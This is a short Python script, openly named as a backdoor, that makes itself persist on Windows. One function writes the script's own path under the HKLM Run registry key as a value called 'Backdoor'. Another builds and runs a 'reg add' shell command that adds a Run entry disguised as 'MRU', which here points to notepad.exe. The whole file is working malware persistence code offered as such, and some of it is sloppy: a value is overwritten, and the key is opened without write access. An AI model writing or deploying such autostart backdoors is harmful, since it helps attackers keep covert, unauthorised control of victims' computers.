import sys, os

from winreg import *

def RegisterPy():
    regpath = "Software\Microsoft\Windows\CurrentVersion\Run"
    sub_key = "Backdoor"
    value = os.path.realpath(__file__)
    with OpenKey(HKEY_LOCAL_MACHINE, regpath) as reg:
        try:
            SetValueEx(reg, sub_key,0, REG_SZ, value)
            CloseKey(reg)
        except Exception as e:
            print("*** Unable to register!\n", e)
            return
        print("--- Backdoor is now registered!")
        return

def reg_add():
	value = os.path.realpath(__file__)
	value = "notepad.exe"
	command = """reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MRU  /t REG_SZ /d "{}" """.format(value)
	result = os.popen(command).read()
	print(result)
    
if __name__ == "__main__":
    reg_add()
